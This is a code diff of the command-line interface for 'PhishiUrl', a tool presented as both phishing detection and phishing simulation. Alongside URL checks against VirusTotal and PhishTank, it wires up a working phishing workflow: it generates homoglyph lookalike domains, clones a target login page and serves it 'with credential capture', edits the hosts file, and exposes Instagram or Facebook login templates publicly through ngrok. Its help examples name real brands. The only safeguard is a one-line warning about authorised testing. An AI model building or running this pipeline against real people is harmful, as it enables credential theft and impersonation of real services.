+            content_str = raw.decode('utf-16-le', errors='replace').lstrip('\ufeff')
+        elif raw.startswith(b'\xfe\xff'):
+            content_str = raw.decode('utf-16-be', errors='replace').lstrip('\ufeff')
+        elif raw.startswith(b'\xef\xbb\xbf'):
+            content_str = raw.decode('utf-8-sig', errors='replace')
+        else:
+            content_str = raw.decode('utf-8', errors='replace')
+        for line in content_str.splitlines():
+            if line.strip():
+                process(line)
+    else:
+        console.print("[red]Provide --url or --file[/red]")
+        return
 
     generate_report(results)
-
-@cli.command()
-@click.option('--port', default=8080, help='Port for tunnel')
-@click.option('--template', default='instagram_login.html', help='Phishing template file')
-def tunnel(port, template):
-    """Start Ngrok tunnel and web server"""
-    tunnel_url = start_ngrok(port)
-    if tunnel_url:
-        start_web_server(port, template=template, local_address=None, ngrok_address=tunnel_url)
-
-@cli.command()
-@click.option('--domain', help='Domain for homoglyph suggestions')
-@click.option('--output', help='Output file for results')
-@click.option('--check-connection', is_flag=True, help='Check connection status')
-@click.option('--check-availability', is_flag=True, help='Check domain availability')
-def suggest(domain, output, check_connection, check_availability):
-    """Suggest homoglyph domains"""
     if output:
         with open(output, 'w', encoding='utf-8') as f:
-            f.write('')
-        display_banner(output)
-    else:
-        display_banner()
-
-    if domain:
-        tld = ''.join(['.' + x for x in domain.split('.')[1:]]) if '.' in domain else ''
-        generate_phishing_urls(domain.split('.')[0], tld, check_connection, output, check_availability)
-    else:
-        console.print("[red]Error: Please provide a domain[/red]")
-
-@cli.command('api_check')
-@click.option('--url', help='URL to analyze')
-@click.option('--service', default='virustotal', help='API service (virustotal, phishtank)')
-def api_check(url, service):
-    """Analyze URL with external APIs"""
-    if url:
-        config = load_config()
-        if service == 'virustotal':
-            result = check_virustotal(url, config.get('virustotal_api_key'))
-        elif service == 'phishtank':
-            result = check_phishtank(url)
-        else:
-            result = {'error': 'Invalid service'}
-        console.print(json.dumps(result, indent=2))
-    else:
-        console.print("[red]Error: Please provide a URL[/red]")
+            json.dump(results, f, indent=2, ensure_ascii=False)
+        console.print(f"[green]Results saved → {output}[/green]")
 
 @cli.command()
-@click.option('--url', help='URL to clone (e.g., https://www.apple.com/login)')
-@click.option('--port', default=8080, help='Port for local server')
-@click.option('--use-ngrok', is_flag=True, help='Expose server via ngrok')
-@click.option('--local-folder', type=click.Path(exists=True, file_okay=False), help='Path to local folder with website files')
-@click.option('--download-js', is_flag=True, help='Download JavaScript files (default: False)')
-@click.option('--download-all', is_flag=True, help='Download all assets including images and fonts (default: False)')
-def clone(url, port, use_ngrok, local_folder, download_js, download_all):
-    """Clone a website or use local files and serve it locally or via ngrok with a homoglyph domain"""
+@click.option('--port',     default=8080,                     help='Local port')
+@click.option('--template', default='instagram_login.html',   help='HTML template filename')
+@click.option('--use-ngrok', is_flag=True,                    help='Expose via ngrok')
+def tunnel(port, template, use_ngrok):
+    """Start a web server (optionally with ngrok tunnel)."""
     display_banner()
-    console.print("[yellow]WARNING: This feature is for ethical pentesting only. Unauthorized use is illegal.[/yellow]")
+    ngrok_url = start_ngrok(port) if use_ngrok else ''
+    start_web_server(port, template=template, ngrok_address=ngrok_url)
 
-    # Prompt for cloning source if not specified
-    use_local = False
-    if local_folder:
-        use_local = True
-    elif url:
-        source = click.prompt("Do you want to clone from the URL or use local files? (url/local)", type=str, default='url')
-        use_local = source.lower() == 'local'
-        if use_local and not local_folder:
-            local_folder = click.prompt("Enter the path to the local folder", type=click.Path(exists=True, file_okay=False))
+@cli.command()
+@click.option('--domain',             required=True, help='Domain to generate homoglyphs for')
+@click.option('--output',                            help='Save results to file')
+@click.option('--check-connection',  is_flag=True,  help='Ping each generated domain')
+@click.option('--check-availability',is_flag=True,  help='WHOIS check each domain')
+def suggest(domain, output, check_connection, check_availability):
+    """Generate homoglyph lookalike domains."""
+    display_banner()
+    tld    = '.' + '.'.join(domain.split('.')[1:]) if '.' in domain else ''
+    base   = domain.split('.')[0]
+    generate_phishing_urls(base, tld, check_connection, output or '', check_availability)
 
-    if not use_local and not url:
-        console.print("[red]Error: Please provide a URL to clone or a local folder[/red]")
-        return
-    if use_local and not local_folder:
-        console.print("[red]Error: Please provide a local folder path[/red]")
-        return
-
-    # Extract domain from URL or derive from homoglyph
-    domain = None
-    if url:
-        domain_match = re.match(r'(?:https?://)?([^/]+)', url)
-        if not domain_match:
-            console.print(f"[red]Invalid URL format: {url}[/red]")
-            return
-        domain = domain_match.group(1)
+@cli.command('api_check')
+@click.option('--url',     required=True, help='URL to check')
+@click.option('--service', default='virustotal',
+              type=click.Choice(['virustotal', 'phishtank']),
+              help='Which API to use')
+def api_check(url, service):
+    """Check a URL against VirusTotal or PhishTank."""
+    display_banner()
+    cfg = load_config()
+    if service == 'virustotal':
+        result = check_virustotal(url, cfg.get('virustotal_api_key', ''))
     else:
-        # For local files, prompt for a domain to generate homoglyphs
-        domain = click.prompt("Enter the domain to generate homoglyphs (e.g., voorivex.academy)", type=str)
+        result = check_phishtank(url, cfg.get('phishtank_api_key', ''))
+    console.print_json(json.dumps(result, indent=2))
 
-    # Generate homoglyph domain
-    suggestions = suggest_homoglyph_domains(domain)
-    homoglyph_domain = None
-    for sugg in suggestions:
-        if sugg['status'] == 'Available' and sugg['domain'] != domain:
-            homoglyph_domain = sugg['domain']
-            break
-    if not homoglyph_domain:
-        console.print("[red]Error: No available homoglyph domain found[/red]")
+@cli.command()
+@click.option('--url',          help='Target URL to clone')
+@click.option('--port',         default=8080, help='Local server port')
+@click.option('--use-ngrok',    is_flag=True, help='Expose via ngrok')
+@click.option('--local-folder', type=click.Path(file_okay=False), help='Use local files instead')
+@click.option('--download-js',  is_flag=True, help='Download JS files')
+@click.option('--download-all', is_flag=True, help='Download all assets')
+@click.option('--use-iframe',   is_flag=True, help='Iframe mode instead of clone')
+def clone(url, port, use_ngrok, local_folder, download_js, download_all, use_iframe):
+    """Clone a website and serve it with credential capture."""
+    display_banner()
+    console.print("[yellow]⚠ For authorised penetration testing ONLY.[/yellow]\n")
+
+    # Determine cloning source
+    use_local = bool(local_folder)
+    if not use_local and not url and not use_iframe:
+        console.print("[red]Provide --url, --local-folder, or --use-iframe[/red]")
         return
-    console.print(f"[green]Selected homoglyph domain: {homoglyph_domain}[/green]")
 
-    # Clone the website or use local files
-    clone_dir = clone_website(url, homoglyph_domain, use_local, local_folder, download_js, download_all)
+    # Derive save name from domain or folder
+    if url:
+        m = re.match(r'(?:https?://)?([^/?#]+)', url)
+        domain   = m.group(1) if m else 'target'
+        save_name = re.sub(r'[^\w.-]', '_', domain)
+    elif local_folder:
+        domain    = click.prompt("Domain for homoglyph generation (e.g. example.com)")
+        save_name = re.sub(r'[^\w.-]', '_', domain)
+    else:
+        domain    = re.match(r'(?:https?://)?([^/?#]+)', url or 'target').group(1)
+        save_name = re.sub(r'[^\w.-]', '_', domain)
+
+    # Homoglyph suggestion (non-blocking – just informational)
+    if not use_iframe:
+        suggestions = generate_homoglyph_suggestions(domain, check_availability=False)
+        if len(suggestions) > 1:
+            console.print(f"[cyan]Example homoglyph: {suggestions[1]['domain']}[/cyan]")
+
+    # Clone
+    clone_dir = clone_website(
+        url          = url or '',
+        save_name    = save_name,
+        use_local    = use_local,
+        local_folder = local_folder or '',
+        download_js  = download_js,
+        download_all = download_all,
+        use_iframe   = use_iframe,
+    )
     if not clone_dir:
         return
 
-    # Modify hosts file for local access
-    local_address = f"http://{homoglyph_domain}:{port}"
-    if modify_hosts_file(homoglyph_domain, '127.0.0.1'):
-        console.print(f"[green]Access locally at: {local_address}[/green]")
-    else:
-        console.print("[yellow]Continuing without hosts file modification[/yellow]")
+    # Optional hosts file
+    local_address = ''
+    if url and not use_iframe:
+        m = re.match(r'(?:https?://)?([^/?#]+)', url)
+        if m:
+            d = m.group(1)
+            suggestions = generate_homoglyph_suggestions(d, check_availability=False)
+            hg = next((s['domain'] for s in suggestions if s['domain'] != d), d)
+            if modify_hosts_file(hg):
+                local_address = f"http://{hg}:{port}"
+            else:
+                local_address = f"http://localhost:{port}"
 
     # Start server
-    ngrok_address = None
-    if use_ngrok:
-        ngrok_address = start_ngrok(port)
-        if ngrok_address:
-            console.print(f"[green]Access remotely at: {ngrok_address}[/green]")
-    start_web_server(port, clone_dir=clone_dir, template='index.html', local_address=local_address, ngrok_address=ngrok_address)
+    ngrok_address = start_ngrok(port) if use_ngrok else ''
+    start_web_server(
+        port,
+        clone_dir     = clone_dir,
+        template      = 'index.html',
+        local_address = local_address,
+        ngrok_address = ngrok_address,
+    )
 
-@cli.command()
-def help():
-    """Display detailed help"""
-    console.print("""
-    PhishiUrl - Phishing Detection and Simulation Tool
-    Commands:
-      check    - Analyze URLs for phishing
-      tunnel   - Start a phishing page tunnel
-      suggest  - Suggest homoglyph domains
-      api_check - Analyze URL with VirusTotal or PhishTank
-      clone    - Clone a website or use local files and serve it with a homoglyph domain
-    Example:
-      phishiurl check --url faceb00k.com
-      phishiurl tunnel --port 8080 --template facebook_login.html
-      phishiurl suggest --domain google.com --check-availability
-      phishiurl api_check --url faceb00k.com --service virustotal
-      phishiurl clone --url https://www.apple.com/login --port 8080 --use-ngrok
-      phishiurl clone --url https://www.apple.com/login --port 8080 --use-ngrok --download-js --download-all
-      phishiurl clone --local-folder ./my_website --port 8080
-    """)
+@cli.command('help')
+def help_cmd():
+    """Show usage examples."""
+    display_banner()
+    console.print(Panel("""
+[bold]Commands[/bold]
+
+  [cyan]check[/cyan]      Analyse URLs for phishing
+  [cyan]tunnel[/cyan]     Serve a phishing template with optional ngrok
+  [cyan]suggest[/cyan]    Generate homoglyph lookalike domains
+  [cyan]api_check[/cyan]  Check a URL with VirusTotal / PhishTank
+  [cyan]clone[/cyan]      Clone a website and serve with credential capture
+  [cyan]help[/cyan]       Show this message
+
+[bold]Examples[/bold]
+
+  phishiurl check --url faceb00k.com
+  phishiurl check --file urls.txt --output results.json
+  phishiurl tunnel --port 8080 --template facebook_login.html --use-ngrok
+  phishiurl suggest --domain google.com --check-availability
+  phishiurl api_check --url faceb00k.com --service virustotal
+  phishiurl clone --url https://example.com/login --port 8080 --download-js --download-all
+  phishiurl clone --url https://example.com/login --port 8080 --use-iframe --use-ngrok
+  phishiurl clone --local-folder ./my_site --port 8080
+""", title="PhishiUrl Help"))
 
 if __name__ == '__main__':
     cli()
